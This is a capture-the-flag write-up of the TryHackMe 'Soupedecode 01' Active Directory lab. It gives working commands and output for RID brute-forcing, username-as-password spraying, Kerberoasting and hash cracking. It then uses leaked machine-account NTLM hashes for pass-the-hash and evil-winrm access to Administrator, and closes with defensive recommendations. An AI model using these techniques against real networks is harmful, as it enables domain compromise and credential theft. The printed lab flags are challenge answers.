---
layout: default
title: Soupedecode 01 - AD
page_type: writeup
---
# THM: Soupedecode 01 – Active Directory Enumeration & Kerberoasting

**By: supra**

**Category:** Active Directory

## 0. Challenge Overview

This challenge presents a Windows Active Directory environment with a Domain Controller. The goal is to gain initial access, escalate privileges, and ultimately compromise the Domain Administrator account.

**The setup:**
- Domain: `SOUPEDECODE.LOCAL`
- Domain Controller: `DC01.SOUPEDECODE.LOCAL`
- Services: SMB, LDAP, Kerberos, RDP, DNS
- Shares: `ADMIN$`, `C$`, `backup`, `Users`, `NETLOGON`, `SYSVOL`
- Users: Numerous domain users including service accounts

**Core concept:** This is a classic **Active Directory penetration test**:
1. Enumerate shares and users
2. Find weak credentials through RID brute-forcing
3. Extract user flag
4. Perform Kerberoasting to get service account hashes
5. Crack service account password
6. Access backup share to obtain machine account hashes
7. Use machine account hash for privilege escalation to Domain Administrator

The attack exploits poor password hygiene, excessive user privileges, and insecure storage of sensitive information.

## 1. Initial Reconnaissance

### Port Scanning

The target was scanned with RustScan for service enumeration:

```bash
rustscan -a 10.65.172.99 --ulimit 5500 -b 65535 -- -A -Pn
```

**Results:**
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49706/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
```

**Key findings:**
- Domain: `SOUPEDECODE.LOCAL`
- Domain Controller: `DC01.SOUPEDECODE.LOCAL`
- Windows Server 2022 Build 20348
- SMB signing enabled and required

### Initial SMB Enumeration

Listed available shares using `smbclient`:

```bash
smbclient -L //10.65.172.99
```

**Shares discovered:**
```
ADMIN$          Disk      Remote Admin
backup          Disk      
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
SYSVOL          Disk      Logon server share 
Users           Disk
```

## 2. User Enumeration

### RID Brute-Forcing

Used NetExec (`nxc`) to perform RID brute-forcing with guest access:

```bash
nxc smb 10.65.172.99 -u 'guest' -p '' --rid-brute
```

This revealed an extensive list of domain users (over 2000 entries were found). The output was cleaned and saved to a file:

```bash
nxc smb 10.65.172.99 -u 'guest' -p '' --rid-brute | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 > users.txt
```

The `users.txt` file contained all discovered users.

### Password Spraying

Attempted password spraying using the username list as both username and password:

```bash
nxc smb 10.65.172.99 -u 'users.txt' -p 'users.txt' --no-bruteforce
```

**Result:** Found valid credentials!
```
[+] SOUPEDECODE.LOCAL\ybob317:ybob317
```

## 3. Initial Access

### Accessing User Files

With valid credentials `ybob317:ybob317`, accessed the `Users` share to retrieve the user flag:

```bash
smbclient //10.65.172.99/Users -U 'ybob317'
```

Navigated to the user's desktop:
```
smb: \> cd ybob317\Desktop\
smb: \ybob317\Desktop\> dir
  desktop.ini                       AHS      282
  user.txt                            A       33
smb: \ybob317\Desktop\> get user.txt
```

**User flag:** `28189316c25dd3c0ad56d44d000d62a8`

## 4. Privilege Escalation

### Kerberoasting

Using the compromised account `ybob317`, performed Kerberoasting to extract service account hashes:

```bash
GetUserSPNs.py 'SOUPEDECODE.LOCAL/ybob317:ybob317' -dc-ip 10.65.172.99 -request -outputfile roast.txt
```

**Service accounts discovered:**
```
ServicePrincipalName    Name
----------------------  ---------------
FTP/FileServer          file_svc
FW/ProxyServer          firewall_svc
HTTP/BackupServer       backup_svc
HTTP/WebServer          web_svc
HTTPS/MonitoringServer  monitoring_svc
```

### Cracking the Hash

Used John the Ripper with the `rockyou.txt` wordlist to crack the Kerberoasted hash:

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt roast.txt
```

**Result:** Cracked the `file_svc` account password!
```
Password123!!    (?)
```

### Enumeration with Service Account

Using the compromised service account credentials `file_svc:Password123!!`, enumerated SMB shares:

```bash
nxc smb dc01.soupedecode.local -u 'file_svc' -p 'Password123!!' --shares
```

**Key finding:** The `backup` share now showed `READ` permissions (previously not listed with guest access).

### Accessing Backup Share

Connected to the backup share and found a critical file:

```bash
smbclient //10.65.172.99/backup -U 'file_svc'
smb: \> dir
  backup_extract.txt                  A      892
smb: \> get backup_extract.txt
```

The `backup_extract.txt` file contained machine account NTLM hashes in the format:
```
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

### Pass-the-Hash Attack

Attempted to authenticate using the machine account hashes:

```bash
nxc smb dc01.soupedecode.local -u backup_extract_user.txt -H backup_extract_hash.txt --no-bruteforce
```

**Success!** The `FileServer$` machine account hash worked:
```
[+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

### Administrative Access

Using the machine account hash, connected via Evil-WinRM for administrative access:

```bash
evil-winrm -i 10.65.172.99 -u FileServer$ -H e41da7e79a4c76dbd9cf79d1cb325559
```

Navigated to the Administrator's desktop and retrieved the root flag:

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
27cb2be302c388d63d27c86bfdd5f56a
```

**Root flag:** `27cb2be302c388d63d27c86bfdd5f56a`

## 5. Attack Summary

### Attack Chain
1. **Reconnaissance:** Port scanning revealed AD services (SMB, LDAP, Kerberos).
2. **Enumeration:** SMB share enumeration and RID brute-forcing identified all domain users.
3. **Credential Discovery:** Password spraying with username-as-password yielded valid credentials (`ybob317:ybob317`).
4. **Initial Access:** Used credentials to access SMB share and retrieve user flag.
5. **Kerberoasting:** Extracted service account hashes from Active Directory.
6. **Hash Cracking:** Cracked the `file_svc` account password (`Password123!!`).
7. **Lateral Movement:** Used `file_svc` credentials to access `backup` share containing machine account hashes.
8. **Privilege Escalation:** Used `FileServer$` machine account hash for administrative access via pass-the-hash.
9. **Domain Compromise:** Retrieved root flag from Administrator's desktop.

### Critical Findings
- **Weak Passwords:** Multiple users had passwords matching their usernames.
- **Excessive Privileges:** The `file_svc` account had access to sensitive backup data.
- **Insecure Storage:** Machine account hashes stored in an accessible file share.
- **Kerberoastable Accounts:** Service accounts with SPNs configured and weak passwords.

## 6. Defensive Recommendations

### Password Policies
- Implement strong password policies with minimum complexity requirements.
- Regularly audit for weak passwords and password reuse.
- Enforce regular password changes, especially for service accounts.

### Service Account Management
- Use Group Managed Service Accounts (gMSAs) instead of standard user accounts for services.
- Apply the principle of least privilege to service accounts.
- Regularly review and remove unnecessary SPNs.

### Access Control
- Restrict access to sensitive shares using proper ACLs.
- Implement network segmentation to limit access to domain controllers.
- Enable SMB signing and encryption to prevent credential relay attacks.

### Monitoring and Detection
- Monitor for abnormal authentication attempts (e.g., password spraying).
- Implement alerts for Kerberoasting activities.
- Regularly audit backup and file share permissions.
- Monitor for pass-the-hash and other lateral movement techniques.

### Backup Security
- Store backup files in secure locations with restricted access.
- Avoid storing credential material in backup files.
- Encrypt sensitive backup data both at rest and in transit.

## 7. Conclusion

This challenge demonstrated several common Active Directory security weaknesses:
1. **Poor password hygiene** allowing easy credential compromise
2. **Overprivileged service accounts** providing access to sensitive data
3. **Insecure storage of credentials** in accessible locations
4. **Kerberoastable accounts** with weak passwords

The attack path followed a logical progression from initial enumeration to full domain compromise, highlighting the importance of defense-in-depth strategies in Active Directory environments.

**Key takeaway:** A single weak password can lead to complete domain compromise when combined with other security misconfigurations. Regular security assessments, proper access controls, and continuous monitoring are essential for maintaining a secure Active Directory environment.

**Flags:**
- User: `28189316c25dd3c0ad56d44d000d62a8`
- Root: `27cb2be302c388d63d27c86bfdd5f56a`
